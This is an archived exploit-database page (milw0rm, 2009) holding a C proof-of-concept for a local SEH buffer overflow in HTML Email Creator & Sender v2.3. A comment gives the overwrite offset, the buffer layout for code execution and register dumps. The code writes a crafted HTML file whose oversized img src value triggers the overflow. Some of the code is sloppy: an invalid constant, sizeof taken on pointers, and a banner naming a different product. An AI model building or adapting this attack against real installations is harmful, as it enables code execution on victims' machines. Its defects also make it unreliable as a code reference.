<html><head><title>HTML Email Creator & Sender 2.3 Local Buffer Overflow PoC (SEH)</title></head><pre>    /*0day  HTML Email Creator &amp; Sender v2.3 Local Buffer Overflow(Seh) Poc
    ********************************************************************
    Debugging info
    Seh handler is overwriten , the offset is at 60 bytes in our buffer 
    so you have to build your buffer as follows:
    [PONTER TO NEXT SEH]-------[SEH HANDLER]----[NOP]------[SHELLCODE]
              |                     |              |            |
            JMP 4 bytes            POP POP RET    50*0x90      calc.exe 
    *********************************************************************
    Code execution is possible.
    CPU Registers
    EAX 00000000
    ECX 00000208
    EDX 00000000
    EBX 00000029
    ESP 0012E224
    EBP 7C8101B1 kernel32.lstrcpynA
    ESI 90909090              &lt;------------------CONTROLED
    EDI 00001209
    EIP 0042E1C7 HtmlEmai.0042E1C7
    */

    #include &lt;stdio.h&gt;
    #include &lt;windows.h&gt;
    #include &lt;string.h&gt;
    #include &lt;getopt.h&gt;
    #include &lt;stdint.h&gt;
    typedef struct Start  {
    uint8_t sh;
    uint8_t st;
    uint8_t sm;
    uint8_t sl;
                          }HTML;

    typedef struct Middle {
    uint8_t sh;
    uint8_t se;    
    uint8_t sa;                     
    uint8_t sd;
  	         	          }HEAD;
     
    typedef struct End    {
    uint8_t sb;
    uint8_t so;
    uint8_t sD;
    uint8_t sy;
                          }BODY;
    #define BUFFERSIZE  0x1A0A
    #define FILESIZE    29A
    #define SRC         &quot;&lt;img src=&quot;
    void Fbuild(char *fname)
    { HTML *ht_ml;
      HEAD *he_ad;
      BODY *bo_dy;
      char *memBuffer;
      //&quot;\x48\x54\x4D\x4C&quot;  -html
      ht_ml = (HTML*)malloc(sizeof(HTML));
      he_ad = (HEAD*)malloc(sizeof(HEAD));
      bo_dy = (BODY*)malloc(sizeof(BODY));
      memBuffer = (char*)malloc(BUFFERSIZE);
      if(ht_ml == NULL || he_ad == NULL || bo_dy == NULL || memBuffer == NULL) { 
      exit(-1);
                                                              } 
      ht_ml-&gt;sh = 0x48;
      ht_ml-&gt;st = 0x54;
      ht_ml-&gt;sm = 0x4D;
      ht_ml-&gt;sl = 0x4C;
      //second structure
      //HEAD &quot;\x48\x45\x41\x44&quot;
      he_ad-&gt;sh = 0x48;
      he_ad-&gt;se = 0x45;
      he_ad-&gt;sa = 0x41;
      he_ad-&gt;sd = 0x44;
      //thierd structure
      //&quot;\x42\x4F\x44\x59&quot;
      bo_dy-&gt;sb = 0x42;
      bo_dy-&gt;so = 0x4F;
      bo_dy-&gt;sD = 0x44;
      bo_dy-&gt;sy = 0x59;
      FILE *f;
      f = fopen(fname, &quot;w&quot;);
      if( f == NULL) {
      exit(-1); 
                     }
      int32_t offset = 0;                    
      memcpy(memBuffer, &quot;&lt;&quot;, 1);  
      offset += 1;  
      memcpy(memBuffer+offset, ht_ml, sizeof(ht_ml));
      offset += sizeof(ht_ml);     
      memcpy(memBuffer+offset, &quot;&gt;&quot;, 1); 
      offset += 1;     
      memcpy(memBuffer+offset, &quot;&lt;&quot;, 1);
      offset += 1;          
      memcpy(memBuffer+offset, he_ad, sizeof(he_ad));
      offset += sizeof(he_ad);
      memcpy(memBuffer+offset, &quot;&gt;&quot;, 1); 
      offset += 1;
      memcpy(memBuffer+offset, &quot;&lt;&quot;, 1); 
      offset += 1;
      memcpy(memBuffer+offset, &quot;\\&quot;, 1);
      offset += 1;
      memcpy(memBuffer+offset, he_ad, sizeof(he_ad)); 
      offset += sizeof(he_ad);
      memcpy(memBuffer+offset, &quot;&gt;&quot;, 1);
      offset += 1;
      memcpy(memBuffer+offset, &quot;&lt;&quot;, 1);
      offset += 1;
      memcpy(memBuffer+offset, bo_dy, sizeof(bo_dy));
      offset += sizeof(bo_dy);
      memcpy(memBuffer+offset, &quot;&gt;&quot;, 1);
      offset += 1;
      uint8_t shit[] ={ 0x3C,0x69,0x6D,0x67,0x20,0x73,0x72,0x63,0x3D };
      memcpy(memBuffer+offset, shit, sizeof(shit));
      offset += sizeof(shit);
      memset(memBuffer+offset, 0x22, 1);
      offset += 1;
      memset(memBuffer+offset, 0x41, 4616);
      offset += 4616;
      memset(memBuffer+offset, 0x22, 1);
      offset += 1;
      memcpy(memBuffer+offset, &quot;&gt;&quot;, 1);
      offset += 1;
      memcpy(memBuffer+offset, &quot;&lt;&quot;, 1);
      offset += 1;
      memcpy(memBuffer+offset, &quot;\\&quot;, 1);
      offset += 1;
      memcpy(memBuffer+offset, bo_dy, sizeof(bo_dy));
      offset += sizeof(bo_dy);
      memcpy(memBuffer+offset, &quot;&gt;&quot;, 1);
      offset += 1;
      memcpy(memBuffer+offset, &quot;&lt;&quot;, 1); 
      offset += 1;
      memcpy(memBuffer+offset, &quot;\\&quot;, 1);
      offset += 1;
      memcpy(memBuffer+offset, ht_ml, sizeof(ht_ml)); 
      offset += sizeof(ht_ml);
      memcpy(memBuffer+offset, &quot;&gt;&quot;, 1);  
      offset += 2; 
      fwrite(memBuffer, offset , 1, f); 
      fwrite(&quot;\x00&quot;, 1, 1, f);
      printf(&quot;File Done!\n&quot;);
    }
     int main(int argc, char *argv[])
    {  char *fname = argv[1];
       system(&quot;CLS&quot;); 
       fprintf(stdout , &quot;::                                         ::\n&quot;);
       fprintf(stdout , &quot;Embedthis Appweb Remote Stack Overflow POC\n&quot;); 
       fprintf(stdout , &quot;All Credits:fl0 fl0w\n&quot;);
       fprintf(stdout , &quot;::                                         ::\n&quot;);
       if(argc &lt; 2) {
       printf(&quot;Usage is %s filename.html\n&quot;, argv[0]);               
       exit(-1);        
                    }       
       Fbuild(fname);
       return 0; 
     }  

// milw0rm.com [2009-08-18]</pre></html>